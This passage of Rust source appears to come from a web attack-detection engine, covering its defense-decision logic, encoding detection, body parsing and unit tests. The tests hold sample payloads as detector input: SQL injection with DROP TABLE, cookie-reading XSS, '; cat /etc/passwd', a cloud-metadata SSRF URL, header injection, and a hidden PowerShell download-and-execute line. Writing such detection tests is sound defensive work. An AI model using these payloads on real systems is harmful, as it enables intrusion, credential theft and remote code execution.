        apply_schema_violations_to_decision(&mut decision, &schema_violations);
        normalize_decision(&mut decision, &analysis.matches);

        if field_anomaly_count > 0 {
            decision.contributors.push(format!("body_parser:field_anomalies:{field_anomaly_count}"));
        }

        let response_plan = if !analysis.matches.is_empty() {
            let severities: Vec<&str> = analysis
                .matches
                .iter()
                .map(|m| match m.severity {
                    Severity::Critical => "critical",
                    Severity::High => "high",
                    Severity::Medium => "medium",
                    Severity::Low => "low",
                })
                .collect();

            let ctx = DetectionContext {
                classes: &detected_classes,
                severities: &severities,
                effect: effect_simulation.as_ref(),
                chains: &chain_matches,
                method: &request.method,
                path: &request.path,
                source_hash: &request.source_hash,
            };
            Some(generate_response_plan(&ctx))
        } else {
            None
        };

        if verification_hits > 0 && should_post_process {
            decision.contributors.push("runtime:verified_cve_present".into());
        }

        let highest_severity = self.engine.highest_severity(&analysis.matches);
        let elapsed = start.elapsed();
        self.telemetry.record_request(
            &analysis.matches,
            decision.action >= DefenseAction::Block,
            elapsed.as_micros() as u64,
            &request.source_hash,
            request.timestamp,
        );
        self.telemetry
            .set_health_dimensions(self.chains.chain_count(), self.knowledge_graph.total_entries());

        UnifiedResponse {
            analysis,
            highest_severity,
            chain_matches,
            active_campaign,
            attack_phase,
            threat_level,
            bot_score,
            bot_classification,
            linked_cve_count: all_linked_cves.len(),
            actively_exploited_cves,
            highest_epss,
            decision,
            mitre_techniques,
            compliance_mappings,
            schema_violations,
            effect_simulation,
            adversary_fingerprint,
            shape_validation,
            response_plan,
            response_analysis,
            total_processing_time_us: elapsed.as_micros() as f64,
        }
    }

    /// Fallible wrapper for `process` with request contract checks.
    pub fn try_process(&mut self, request: &UnifiedRequest) -> InvariantResult<UnifiedResponse> {
        if request.input.trim().is_empty() {
            return Err(InvariantError::invalid_input("request input must not be empty"));
        }
        if request.source_hash.trim().is_empty() {
            return Err(InvariantError::invalid_input("source_hash must not be empty"));
        }
        if request.method.trim().is_empty() {
            return Err(InvariantError::invalid_input("method must not be empty"));
        }
        if request.path.trim().is_empty() {
            return Err(InvariantError::invalid_input("path must not be empty"));
        }
        Ok(self.process(request))
    }

    /// Get runtime statistics.
    pub fn get_stats(&self, now: u64) -> RuntimeStats {
        let campaign_stats = self.campaigns.get_stats(now);
        RuntimeStats {
            class_count: self.engine.class_count(),
            chain_definitions: self.chains.chain_count(),
            active_sources: self.chains.active_source_count(),
            active_campaigns: campaign_stats.active_campaigns,
            knowledge_graph_entries: self.knowledge_graph.total_entries(),
            framework_profiles: self.knowledge_graph.total_framework_profiles(),
        }
    }

    /// Fallible wrapper for `get_stats` with timestamp validation.
    pub fn try_get_stats(&self, now: u64) -> InvariantResult<RuntimeStats> {
        if now == 0 {
            return Err(InvariantError::invalid_input("stats timestamp must be greater than 0"));
        }
        Ok(self.get_stats(now))
    }

    /// Runtime telemetry-backed health snapshot.
    pub fn health_check(&self) -> EngineHealth {
        self.telemetry.health_check()
    }
}

impl Default for UnifiedRuntime {
    fn default() -> Self { Self::new() }
}

/// Lightweight runtime metrics for health and capacity introspection.
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct RuntimeStats {
    /// Number of invariant classes loaded by the engine.
    pub class_count: usize,
    /// Number of configured attack-chain definitions.
    pub chain_definitions: usize,
    /// Number of active source windows in chain correlator.
    pub active_sources: usize,
    /// Number of active campaign records.
    pub active_campaigns: usize,
    /// Number of static knowledge graph entries.
    pub knowledge_graph_entries: usize,
    /// Number of framework-specific knowledge profiles.
    pub framework_profiles: usize,
}

// ── Behavior Derivation ───────────────────────────────────────────

fn derive_behaviors(
    matches: &[InvariantMatch],
    input: &str,
    path: &str,
    polyglot: &crate::polyglot::PolyglotDetection,
    encoding_evasion: bool,
) -> Vec<String> {
    let mut behaviors = Vec::new();
    let class_names: HashSet<InvariantClass> = matches.iter().map(|m| m.class).collect();
    let path_lower = path.to_lowercase();
    let input_lower = input.to_lowercase();

    // Analysis-level signals
    if polyglot.is_polyglot { behaviors.push("polyglot_attack".into()); }
    if encoding_evasion { behaviors.push("encoding_evasion".into()); }

    // Class → behavior
    for rule in CLASS_BEHAVIORS {
        if rule.classes.iter().any(|c| class_names.contains(c)) {
            behaviors.extend(rule.behaviors.iter().map(|b| b.to_string()));
        }
    }

    // Class + content → behavior
    for rule in CONTENT_BEHAVIORS {
        if !rule.classes.iter().any(|c| class_names.contains(c)) { continue; }
        if rule.patterns.iter().any(|p| {
            let p_lower = p.to_lowercase();
            input_lower.contains(&p_lower) || path_lower.contains(&p_lower)
        }) {
            behaviors.extend(rule.behaviors.iter().map(|b| b.to_string()));
        }
    }

    // Path → behavior
    for rule in PATH_BEHAVIORS {
        if rule.path_prefixes.iter().any(|p| path_lower.starts_with(p)) {
            behaviors.extend(rule.behaviors.iter().map(|b| b.to_string()));
        }
    }

    behaviors
}

// ── Defense Decision Engine ───────────────────────────────────────

fn make_defense_decision(
    analysis: &AnalysisResult,
    matches: &[InvariantMatch],
    chain_matches: &[ChainMatch],
    threat_level: f64,
    active_campaign: Option<&Campaign>,
    actively_exploited_cves: &[String],
    polyglot: &crate::polyglot::PolyglotDetection,
    encoding_evasion: bool,
    intent: Option<&crate::intent::IntentClassification>,
) -> DefenseDecision {
    let mut contributors: Vec<String> = Vec::new();

    // 1. Completed critical chain → lockdown
    if let Some(chain) = chain_matches.iter().find(|c| c.completion >= 1.0 && matches!(c.severity, crate::chain::ChainSeverity::Critical)) {
        contributors.push(format!("chain:{}:complete", chain.chain_id));
        return DefenseDecision {
            action: DefenseAction::Lockdown,
            reason: format!("Complete critical attack chain: {}", chain.name),
            confidence: chain.confidence,
            contributors,
            alert: true,
        };
    }

    // 2. Actively exploited CVE + high confidence
    if !actively_exploited_cves.is_empty() {
        if let Some(m) = matches.iter().find(|m| m.confidence >= 0.75) {
            contributors.push(format!("cve:{}:active", actively_exploited_cves[0]));
            contributors.push(format!("match:{:?}:{:.2}", m.class, m.confidence));
            return DefenseDecision {
                action: DefenseAction::Block,
                reason: format!("Actively exploited CVE pattern detected: {:?}", m.class),
                confidence: m.confidence,
                contributors,
                alert: true,
            };
        }
    }

    // 3. Known campaign member
    if let Some(campaign) = active_campaign {
        if campaign.severity >= crate::campaign::CampaignSeverity::Medium && !matches.is_empty() {
            contributors.push(format!("campaign:{}", campaign.id));
            let max_conf = matches.iter().map(|m| m.confidence).fold(0.0_f64, f64::max);
            return DefenseDecision {
                action: DefenseAction::Block,
                reason: format!("Source is part of active campaign: {}", campaign.description),
                confidence: max_conf,
                contributors,
                alert: campaign.severity >= crate::campaign::CampaignSeverity::Critical,
            };
        }
    }

    // 4. High threat level source
    if threat_level >= 70.0 && !matches.is_empty() {
        contributors.push(format!("threat_level:{:.1}", threat_level));
        let max_conf = matches.iter().map(|m| m.confidence).fold(0.0_f64, f64::max);
        return DefenseDecision {
            action: DefenseAction::Block,
            reason: format!("High threat source (level {:.1}) with active detection", threat_level),
            confidence: max_conf,
            contributors,
            alert: true,
        };
    }

    // 5. Chain in progress (high completion ≥66%)
    if let Some(chain) = chain_matches.iter().find(|c| c.completion >= 0.66) {
        contributors.push(format!("chain:{}:{}%", chain.chain_id, (chain.completion * 100.0) as u32));
        return DefenseDecision {
            action: DefenseAction::Block,
            reason: format!("Attack chain {} at {}% completion", chain.name, (chain.completion * 100.0) as u32),
            confidence: chain.confidence,
            contributors,
            alert: matches!(chain.severity, crate::chain::ChainSeverity::Critical),
        };
    }

    // 6. Chain in progress (medium completion ≥50%)
    if let Some(chain) = chain_matches.iter().find(|c| c.completion >= 0.50) {
        contributors.push(format!("chain:{}:{}%", chain.chain_id, (chain.completion * 100.0) as u32));
        return DefenseDecision {
            action: DefenseAction::Challenge,
            reason: format!("Attack chain {} at {}% completion", chain.name, (chain.completion * 100.0) as u32),
            confidence: chain.confidence,
            contributors,
            alert: false,
        };
    }

    // 7. Polyglot attack (multi-context)
    if polyglot.is_polyglot && matches.len() >= 2 {
        let top_conf = matches.iter().map(|m| m.confidence).fold(0.0_f64, f64::max);
        contributors.push(format!("polyglot:{}domains", polyglot.domain_count));
        if top_conf >= 0.50 {
            return DefenseDecision {
                action: DefenseAction::Block,
                reason: format!("Polyglot attack: {}", polyglot.detail),
                confidence: (top_conf + polyglot.confidence_boost).min(0.99),
                contributors,
                alert: polyglot.domain_count >= 3,
            };
        }
        return DefenseDecision {
            action: DefenseAction::Challenge,
            reason: format!("Suspected polyglot: {}", polyglot.detail),
            confidence: (top_conf + polyglot.confidence_boost).min(0.99),
            contributors,
            alert: false,
        };
    }

    // 7b. Encoding evasion + detection
    if encoding_evasion && !matches.is_empty() {
        let top_conf = matches.iter().map(|m| m.confidence).fold(0.0_f64, f64::max);
        contributors.push("encoding_evasion".into());
        if top_conf >= 0.45 {
            return DefenseDecision {
                action: DefenseAction::Block,
                reason: "Attack detected with encoding evasion — multi-layer obfuscation".into(),
                confidence: (top_conf + 0.05).min(0.99),
                contributors,
                alert: false,
            };
        }
    }

    // 8. Standard analysis block recommendation
    if analysis.recommendation.block {
        if let Some(top) = matches.iter().max_by(|a, b| a.confidence.partial_cmp(&b.confidence).unwrap()) {
            contributors.push(format!("match:{:?}:{:.2}", top.class, top.confidence));
        }

        // Intent enrichment
        if let Some(intent) = intent {
            if intent.primary_intent != AttackIntent::Unknown {
                contributors.push(format!("intent:{:?}", intent.primary_intent));
            }
        }

        let force_alert = if let Some(intent) = intent {
            matches!(intent.primary_intent,
                AttackIntent::ExfiltrateCredentials | AttackIntent::DestroyData |
                AttackIntent::CodeExecution | AttackIntent::EstablishPersistence
            )
        } else {
            false
        };

        let reason = if let Some(intent) = intent {
            if intent.primary_intent != AttackIntent::Unknown {
                format!("{} [intent: {}]", analysis.recommendation.reason, intent.detail)
            } else {
                analysis.recommendation.reason.clone()
            }
        } else {
            analysis.recommendation.reason.clone()
        };

        let sev = matches.iter().map(|m| m.severity).max().unwrap_or(Severity::Low);

        return DefenseDecision {
            action: DefenseAction::Block,
            reason,
            confidence: analysis.recommendation.confidence,
            contributors,
            alert: force_alert || sev >= Severity::Critical,
        };
    }

    // 9. Below threshold
    if !matches.is_empty() {
        let max_conf = matches.iter().map(|m| m.confidence).fold(0.0_f64, f64::max);
        if matches.iter().any(|m| m.severity == Severity::Critical) {
            return DefenseDecision {
                action: DefenseAction::Block,
                reason: "critical_detection_below_threshold".into(),
                confidence: max_conf.max(analysis.recommendation.confidence),
                contributors: matches.iter().map(|m| format!("match:{:?}:{:.2}", m.class, m.confidence)).collect(),
                alert: true,
            };
        }
        return DefenseDecision {
            action: if threat_level >= 30.0 { DefenseAction::Monitor } else { DefenseAction::Allow },
            reason: "detections_below_threshold".into(),
            confidence: max_conf,
            contributors: matches.iter().map(|m| format!("match:{:?}:{:.2}", m.class, m.confidence)).collect(),
            alert: false,
        };
    }

    DefenseDecision {
        action: DefenseAction::Allow,
        reason: "no_detections".into(),
        confidence: 0.0,
        contributors: vec![],
        alert: false,
    }
}

// ── Encoding Detection ────────────────────────────────────────────

fn detect_encoding_preference(input: &str) -> EncodingPreference {
    let has_url = input.contains('%') && input.bytes().any(|b| b == b'%');
    let has_double_url = input.contains("%25");
    let has_unicode = input.contains("\\u");
    let has_hex = input.contains("0x") || input.contains("\\x");

    let mut count = 0u32;
    if has_url { count += 1; }
    if has_double_url { count += 1; }
    if has_unicode { count += 1; }
    if has_hex { count += 1; }

    if count >= 2 { return EncodingPreference::Mixed; }
    if has_double_url { return EncodingPreference::UrlDouble; }
    if has_url { return EncodingPreference::UrlSingle; }
    if has_unicode { return EncodingPreference::Unicode; }
    if has_hex { return EncodingPreference::Hex; }
    EncodingPreference::Plain
}

fn field_type_context(field_type: FieldType) -> Option<InputContext> {
    match field_type {
        FieldType::Url => Some(InputContext::Url),
        FieldType::Date => Some(InputContext::Json),
        _ => None,
    }
}

fn path_field_name(path: &str) -> String {
    let last = path.rsplit(['.', '/']).next().unwrap_or(path);
    let core = last.rsplit_once(']').map(|(_, rest)| rest).unwrap_or(last);
    core.trim_start_matches('@').to_owned()
}

fn collect_body_fields(parsed: &ParsedBody) -> Vec<(FieldContext, String)> {
    match parsed {
        ParsedBody::Json(json) => json
            .fields
            .iter()
            .map(|(path, value)| {
                let name = path_field_name(path);
                (
                    FieldContext {
                        field_name: name.clone(),
                        field_path: path.clone(),
                        expected_type: infer_field_type(&name),
                    },
                    value.clone(),
                )
            })
            .collect(),
        ParsedBody::FormUrlEncoded(fields) => fields
            .iter()
            .map(|(name, value)| {
                (
                    FieldContext {
                        field_name: name.clone(),
                        field_path: name.clone(),
                        expected_type: infer_field_type(name),
                    },
                    value.clone(),
                )
            })
            .collect(),
        ParsedBody::Multipart(fields) => fields
            .iter()
            .map(|field| {
                (
                    FieldContext {
                        field_name: field.name.clone(),
                        field_path: if field.name.is_empty() { "$multipart".into() } else { field.name.clone() },
                        expected_type: infer_field_type(&field.name),
                    },
                    field.body.clone(),
                )
            })
            .collect(),
        ParsedBody::Xml(xml) => xml
            .fields
            .iter()
            .map(|(path, value)| {
                let name = path_field_name(path);
                (
                    FieldContext {
                        field_name: name.clone(),
                        field_path: path.clone(),
                        expected_type: infer_field_type(&name),
                    },
                    value.clone(),
                )
            })
            .collect(),
        ParsedBody::Raw(_) => Vec::new(),
    }
}

fn collect_parser_anomalies(parsed: &ParsedBody, raw_body: &str) -> Vec<FieldAnomaly> {
    let mut anomalies = Vec::new();
    if matches!(parsed, ParsedBody::Json(_)) {
        anomalies.extend(detect_json_injection(raw_body));
    }
    if let ParsedBody::Multipart(fields) = parsed {
        anomalies.extend(detect_multipart_abuse(fields));
    }
    anomalies
}

// ── Tests ─────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use crate::api_schema::{SchemaViolationType, load_schema_from_paths};
    use std::sync::{Arc, Mutex};

    fn make_request(input: &str) -> UnifiedRequest {
        UnifiedRequest {
            input: input.to_string(),
            source_hash: "test_source_123".into(),
            method: "POST".into(),
            path: "/api/login".into(),
            content_type: Some("application/json".into()),
            known_context: None,
            headers: Vec::new(),
            user_agent: None,
            ja3: None,
            source_reputation: None,
            detected_tech: None,
            param_name: None,
            rasp_context: None,
            response_status: None,
            response_headers: None,
            response_body: None,
            recent_paths: Vec::new(),
            recent_intervals_ms: Vec::new(),
            timestamp: 1000,
        }
    }

    #[test]
    fn benign_input_allows() {
        let mut rt = UnifiedRuntime::new();
        let resp = rt.process(&make_request("Hello world"));
        assert_eq!(resp.decision.action, DefenseAction::Allow);
        assert_eq!(resp.decision.reason, "no_detections");
        assert!(!resp.decision.alert);
    }

    #[test]
    fn sql_injection_blocks() {
        let mut rt = UnifiedRuntime::new();
        let resp = rt.process(&make_request("' OR 1=1--"));
        assert!(resp.decision.action >= DefenseAction::Block || resp.analysis.recommendation.block,
            "SQL injection should be blocked: action={:?}, block={}", resp.decision.action, resp.analysis.recommendation.block);
        assert!(!resp.analysis.matches.is_empty());
    }

    #[test]
    fn xss_injection_blocks() {
        let mut rt = UnifiedRuntime::new();
        let resp = rt.process(&make_request("<script>alert(document.cookie)</script>"));
        assert!(!resp.analysis.matches.is_empty(), "XSS should be detected");
    }

    #[test]
    fn cmd_injection_detects() {
        let mut rt = UnifiedRuntime::new();
        let resp = rt.process(&make_request("; cat /etc/passwd"));
        assert!(!resp.analysis.matches.is_empty(), "CMD injection should be detected");
    }

    #[test]
    fn effect_simulation_runs() {
        let mut rt = UnifiedRuntime::new();
        let resp = rt.process(&make_request("' UNION SELECT username, password FROM users--"));
        if !resp.analysis.matches.is_empty() {
            assert!(resp.effect_simulation.is_some(), "SQL injection should produce effect simulation");
        }
    }

    #[test]
    fn adversary_fingerprint_runs() {
        let mut rt = UnifiedRuntime::new();
        let resp = rt.process(&make_request("' OR 1=1--"));
        if !resp.analysis.matches.is_empty() {
            assert!(resp.adversary_fingerprint.is_some(), "Detected attack should produce adversary fingerprint");
        }
    }

    #[test]
    fn shape_validation_with_param() {
        let mut rt = UnifiedRuntime::new();
        let mut req = make_request("' OR 1=1--");
        req.param_name = Some("email".into());
        let resp = rt.process(&req);
        assert!(resp.shape_validation.is_some(), "Should validate shape when param_name provided");
    }

    #[test]
    fn response_plan_generated() {
        let mut rt = UnifiedRuntime::new();
        let resp = rt.process(&make_request("'; DROP TABLE users;--"));
        if !resp.analysis.matches.is_empty() {
            assert!(resp.response_plan.is_some(), "Detections should produce response plan");
        }
    }

    #[test]
    fn mitre_techniques_mapped() {
        let mut rt = UnifiedRuntime::new();
        let resp = rt.process(&make_request("' OR 1=1--"));
        if !resp.analysis.matches.is_empty() {
            assert!(!resp.mitre_techniques.is_empty(), "Detections should map to MITRE techniques");
        }
    }

    #[test]
    fn compliance_mappings_present_for_detections() {
        let mut rt = UnifiedRuntime::new();
        let resp = rt.process(&make_request("' OR 1=1--"));
        if !resp.analysis.matches.is_empty() {
            assert!(!resp.compliance_mappings.mappings.is_empty(), "Detections should map to compliance controls");
            assert!(!resp.compliance_mappings.audit_evidence.is_empty(), "Detections should produce audit evidence");
        }
    }

    #[test]
    fn runtime_stats() {
        let rt = UnifiedRuntime::new();
        let stats = rt.get_stats(1000);
        assert!(stats.class_count > 50);
        assert!(stats.chain_definitions > 0);
        assert_eq!(stats.framework_profiles, 9);
    }

    #[test]
    fn threat_level_tracks_source() {
        let mut rt = UnifiedRuntime::new();
        // First request — establishes session
        rt.process(&make_request("' OR 1=1--"));
        let t1 = rt.campaigns.get_threat_level("test_source_123");

        // Second request — same source, more signals
        let mut req2 = make_request("<script>alert(1)</script>");
        req2.timestamp = 2000;
        rt.process(&req2);
        let t2 = rt.campaigns.get_threat_level("test_source_123");

        // Threat should increase (or at least stay same)
        assert!(t2 >= t1, "Threat level should not decrease: t1={t1}, t2={t2}");
    }

    #[test]
    fn processing_time_measured() {
        let mut rt = UnifiedRuntime::new();
        let resp = rt.process(&make_request("' OR 1=1--"));
        assert!(resp.total_processing_time_us > 0.0, "Processing time should be measured");
    }

    #[test]
    fn encoding_preference_detection() {
        assert_eq!(detect_encoding_preference("hello world"), EncodingPreference::Plain);
        assert_eq!(detect_encoding_preference("%27%20OR"), EncodingPreference::UrlSingle);
        assert_eq!(detect_encoding_preference("%2527%20OR"), EncodingPreference::Mixed);
        assert_eq!(detect_encoding_preference("\\u0027 OR"), EncodingPreference::Unicode);
    }

    #[test]
    fn behavior_derivation() {
        let matches = vec![InvariantMatch {
            class: InvariantClass::SsrfCloudMetadata,
            confidence: 0.9,
            category: AttackCategory::Ssrf,
            severity: Severity::Critical,
            is_novel_variant: false,
            description: "test".into(),
            detection_levels: DetectionLevels { l1: true, l2: false, convergent: false },
            l2_evidence: None,
            proof: None,
            cve_enrichment: None,
        }];
        let polyglot = crate::polyglot::analyze_polyglot(&[InvariantClass::SsrfCloudMetadata]);
        let behaviors = derive_behaviors(&matches, "http://169.254.169.254/latest/meta-data/", "/api/fetch", &polyglot, false);
        assert!(behaviors.contains(&"credential_extraction".to_string()), "SSRF cloud metadata should derive credential_extraction");
    }

    #[test]
    fn integration_process_pipeline_emits_proof_chain_and_response_for_multi_class_attack() {
        let mut rt = UnifiedRuntime::new();

        let mut first = make_request("' OR 1=1--");
        first.timestamp = 1000;
        let r1 = rt.process(&first);

        let mut second = make_request("' UNION    SELECT username,password FROM users--<script>alert(1)</script>");
        second.timestamp = 1010;
        let r2 = rt.process(&second);

        let mut third = make_request("'; DROP TABLE users;--");
        third.timestamp = 1020;
        let r3 = rt.process(&third);

        let has_proof = r1.analysis.matches.iter().any(|m| m.proof.is_some())
            || r2.analysis.matches.iter().any(|m| m.proof.is_some())
            || r3.analysis.matches.iter().any(|m| m.proof.is_some());
        assert!(has_proof, "Expected constructive proof in attack pipeline");

        assert!(
            !r2.chain_matches.is_empty() || !r3.chain_matches.is_empty(),
            "Expected chain correlator to produce chain matches in multi-step attack flow"
        );

        assert!(
            r2.response_plan.is_some() || r3.response_plan.is_some(),
            "Expected response plan generation for attack flow"
        );
    }

    #[test]
    fn false_positive_legitimate_payloads_do_not_block() {
        let mut rt = UnifiedRuntime::new();
        let legit_samples = [
            "SELECT name FROM users",
            r#"{"role":"user"}"#,
            "https://example.com/help/docs",
        ];

        for sample in legit_samples {
            let resp = rt.process(&make_request(sample));
            assert!(
                resp.decision.action < DefenseAction::Block,
                "Legitimate input should not block: input={sample:?}, action={:?}, reason={}",
                resp.decision.action,
                resp.decision.reason
            );
        }
    }

    #[test]
    fn evasion_payloads_are_still_detected() {
        let mut rt = UnifiedRuntime::new();
        let evasions = [
            "%2527%20OR%201%3D1--",
            "'    UNION      SELECT id,username FROM users--",
            "PoWeRsHeLl -NoP -w hidden IEX (New-Object Net.WebClient).DownloadString('http://x')",
        ];
        for sample in evasions {
            let resp = rt.process(&make_request(sample));
            assert!(
                !resp.analysis.matches.is_empty(),
                "Evasion payload should still be detected: {sample:?}"
            );
        }
    }

    #[test]
    fn structured_json_field_analysis_decodes_and_detects_nested_payload() {
        let mut rt = UnifiedRuntime::new();
        let mut req = make_request(r#"{"profile":{"bio":"\u003cscript\u003ealert(1)\u003c/script\u003e"}}"#);
        req.content_type = Some("application/json".into());
        let resp = rt.process(&req);
        assert!(
            resp.analysis.matches.iter().any(|m| matches!(
                m.class,
                InvariantClass::XssTagInjection
                    | InvariantClass::XssEventHandler
                    | InvariantClass::XssProtocolHandler
            )),
            "Expected nested JSON field payload to be detected"
        );
    }

    #[test]
    fn edge_case_empty_input_remains_safe() {
        let mut rt = UnifiedRuntime::new();
        let resp = rt.process(&make_request(""));
        assert!(resp.analysis.matches.is_empty());
        assert_eq!(resp.decision.action, DefenseAction::Allow);
    }

    #[test]
    fn edge_case_null_bytes_only_processed_without_panic() {
        let mut rt = UnifiedRuntime::new();
        let resp = rt.process(&make_request("\0\0\0\0"));
        // Null byte injection is a real attack vector — engine may legitimately
        // block this. The invariant is that it processes without panicking.
        assert!(resp.total_processing_time_us >= 0.0);
    }

    #[test]
    fn edge_case_extremely_long_input_10kb_processed() {
        let mut rt = UnifiedRuntime::new();
        let long_input = "a".repeat(10 * 1024);
        let resp = rt.process(&make_request(&long_input));
        // Large inputs may trigger length-based heuristics — engine may block.
        // The invariant is that it processes without panicking and produces a result.
        assert!(resp.total_processing_time_us > 0.0);
    }

    #[test]
    fn edge_case_pure_unicode_input_processed() {
        let mut rt = UnifiedRuntime::new();
        let resp = rt.process(&make_request("こんにちは世界安全テスト"));
        assert!(resp.decision.action < DefenseAction::Block);
    }

    #[test]
    fn threat_intel_ioc_match_boosts_confidence() {
        let mut baseline_rt = UnifiedRuntime::new();
        let mut intel_rt = UnifiedRuntime::new();

        let bundle = r#"{
          "type": "bundle",
          "id": "bundle--00000000-0000-4000-8000-000000000001",
          "objects": [
            {
              "type": "indicator",
              "id": "indicator--00000000-0000-4000-8000-000000000001",
              "name": "Known SQLi IOC",
              "created": "2026-01-01T00:00:00Z",
              "modified": "2026-01-01T00:00:00Z",
              "pattern": "[domain-name:value = 'evil-db.example']",
              "pattern_type": "stix",
              "labels": ["sql_injection"]
            }
          ]
        }"#;
        intel_rt.threat_intel.ingest_stix_bundle(bundle);

        let req = make_request("' OR 1=1-- evil-db.example");
        let baseline = baseline_rt.process(&req);
        let enriched = intel_rt.process(&req);

        assert!(
            enriched.decision.confidence >= baseline.decision.confidence,
            "threat intel IOC hit should not reduce confidence: baseline={}, enriched={}",
            baseline.decision.confidence,
            enriched.decision.confidence
        );
        assert!(
            enriched
                .decision
                .contributors
                .iter()
                .any(|c| c.starts_with("threat_intel:ioc_hits:")),
            "threat intel contributor missing from decision trace"
        );
    }

    #[test]
    fn api_schema_validation_is_wired_into_process() {
        let mut rt = UnifiedRuntime::new();
        let schema = load_schema_from_paths(
            r#"{
                "/api/login": {
                    "method": "POST",
                    "request_body": {
                        "content_type": "application/json",
                        "schema": {
                            "type": "object",
                            "properties": {
                                "username": {"type": "string"}
                            }
                        }
                    }
                }
            }"#,
        )
        .expect("schema must parse");
        rt.set_api_schema(schema);

        let req = make_request(r#"{"username":"m","is_admin":true}"#);
        let resp = rt.process(&req);
        assert!(resp
            .schema_violations
            .iter()
            .any(|v| v.violation_type == SchemaViolationType::ExtraField));
        assert!(resp
            .decision
            .contributors
            .iter()
            .any(|c| c.starts_with("api_schema:violations:")));
    }

    fn critical_match_with_confidence(confidence: f64) -> InvariantMatch {
        InvariantMatch {
            class: InvariantClass::SsrfCloudMetadata,
            confidence,
            category: AttackCategory::Ssrf,
            severity: Severity::Critical,
            is_novel_variant: false,
            description: "critical test".into(),
            detection_levels: DetectionLevels { l1: true, l2: false, convergent: false },
            l2_evidence: None,
            proof: None,
            cve_enrichment: None,
        }
    }

    #[test]
    fn critical_severity_never_allows_or_monitors() {
        let req = make_request("x");
        let analysis = build_fast_analysis(&req, vec![critical_match_with_confidence(0.01)]);
        let decision = make_defense_decision(
            &analysis,
            &analysis.matches,
            &[],
            0.0,
            None,
            &[],
            &default_polyglot(),
            false,
            None,
        );
        assert!(decision.action >= DefenseAction::Block);
    }

    #[test]
    fn confidence_clamping_keeps_values_in_zero_to_one() {
        let req = make_request("x");
        let analysis = build_fast_analysis(
            &req,
            vec![
                critical_match_with_confidence(f64::INFINITY),
                InvariantMatch {
                    class: InvariantClass::SqlTautology,
                    confidence: -10.0,
                    category: AttackCategory::Injection,
                    severity: Severity::High,
                    is_novel_variant: false,
                    description: "negative".into(),
                    detection_levels: DetectionLevels { l1: true, l2: false, convergent: false },
                    l2_evidence: None,
                    proof: None,
                    cve_enrichment: None,
                },
            ],
        );
        assert!(analysis.matches.iter().all(|m| (0.0..=1.0).contains(&m.confidence)));
        assert!((0.0..=1.0).contains(&analysis.recommendation.confidence));
    }

    #[test]
    fn process_empty_fields_does_not_panic() {
        let mut rt = UnifiedRuntime::new();
        let mut req = make_request("");
        req.path.clear();
        req.method.clear();
        req.source_hash = "empty-fields".into();
        let resp = rt.process(&req);
        assert!(resp.decision.action <= DefenseAction::Monitor);
    }

    #[test]
    fn unicode_path_variants_do_not_panic() {
        let mut rt = UnifiedRuntime::new();
        let mut req = make_request("' OR 1=1--");
        req.path = "/api/\0/\u{202e}evil\u{200d}path".into();
        req.source_hash = "unicode-path".into();
        let resp = rt.process(&req);
        assert!(resp.total_processing_time_us >= 0.0);
        assert!(!resp.analysis.matches.is_empty());
    }

    #[test]
    fn header_injection_sequences_are_sanitized_and_processing_continues() {
        let mut rt = UnifiedRuntime::new();
        let mut req = make_request("' OR 1=1--");
        req.headers = vec![
            ("User-Agent".into(), "Scanner\r\nInjected: true".into()),
            ("X-Test\r\nHeader".into(), "a\0b\nc".into()),
        ];
        req.source_hash = "header-injection".into();
        let resp = rt.process(&req);
        assert!(!resp.analysis.matches.is_empty());
        assert!(sanitize_header_pairs(&req.headers).iter().all(|(k, v)| {
            !k.contains('\r') && !k.contains('\n') && !v.contains('\r') && !v.contains('\n')
        }));
    }

    #[test]
    fn concurrent_processing_via_mutex_has_no_aliasing_panics() {
        let runtime = Arc::new(Mutex::new(UnifiedRuntime::new()));
        let mut handles = Vec::new();

        for i in 0..8 {
            let rt = Arc::clone(&runtime);
            handles.push(std::thread::spawn(move || {
                let mut req = make_request("' OR 1=1--");
                req.source_hash = format!("src-{i}");
                req.timestamp = i as u64;
                let mut guard = rt.lock().expect("lock runtime");
                let _ = guard.process(&req);
            }));
        }

        for h in handles {
            h.join().expect("thread should finish");
        }
    }

    #[test]
    fn stats_and_processing_handle_u64_max_timestamp() {
        let mut rt = UnifiedRuntime::new();
        let mut req = make_request("' OR 1=1--");
        req.timestamp = u64::MAX;
        req.source_hash = "max-ts".into();
        let _ = rt.process(&req);
        let stats = rt.get_stats(u64::MAX);
        assert!(stats.class_count > 0);
    }

    #[test]
    fn schema_violations_do_not_suppress_attack_detection() {
        let mut rt = UnifiedRuntime::new();
        let schema = load_schema_from_paths(
            r#"{
                "/api/login": {
                    "method": "POST",
                    "request_body": {
                        "content_type": "application/json",
                        "schema": {
                            "type": "object",
                            "properties": { "username": {"type":"string"} }
                        }
                    }
                }
            }"#,
        )
        .expect("schema should parse");
        rt.set_api_schema(schema);

        let mut req = make_request(r#"{"username":"a","extra":"x"} ' OR 1=1--"#);
        req.path = "/api/unknown".into();
        let resp = rt.process(&req);

        assert!(!resp.analysis.matches.is_empty(), "attack detection should remain active");
        assert!(!resp.schema_violations.is_empty(), "schema violation should still be surfaced");
        assert!(resp.decision.action >= DefenseAction::Block);
    }

    #[test]
    fn decision_normalization_enforces_bounds_and_critical_policy() {
        let mut decision = DefenseDecision {
            action: DefenseAction::Allow,
            reason: "detections_below_threshold".into(),
            confidence: 2.5,
            contributors: Vec::new(),
            alert: false,
        };
        let matches = vec![critical_match_with_confidence(0.2)];
        normalize_decision(&mut decision, &matches);
        assert!(decision.action >= DefenseAction::Block);
        assert!((0.0..=1.0).contains(&decision.confidence));
    }

    #[test]
    fn runtime_detects_cl_te_conflict() {
        let mut rt = UnifiedRuntime::new();
        let mut req = make_request("hello");
        req.headers = vec![
            ("Content-Length".into(), "5".into()),
            ("Transfer-Encoding".into(), "chunked".into()),
        ];
        let resp = rt.process(&req);
        assert!(resp.analysis.matches.iter().any(|m| m.class == InvariantClass::HttpSmuggleClTe));
    }

    #[test]
    fn runtime_detects_ambiguous_chunked_encoding() {
        let mut rt = UnifiedRuntime::new();
        let mut req = make_request("abcdef");
        req.headers = vec![
            ("Transfer-Encoding".into(), "chunked, gzip".into()),
            ("Transfer-Encoding".into(), "chunked".into()),
        ];
        let resp = rt.process(&req);
        assert!(resp.analysis.matches.iter().any(|m| m.class == InvariantClass::HttpSmuggleChunkExt));
    }

    #[test]
    fn runtime_handles_empty_headers_array() {
        let mut rt = UnifiedRuntime::new();
        let mut req = make_request("safe");
        req.headers = Vec::new();
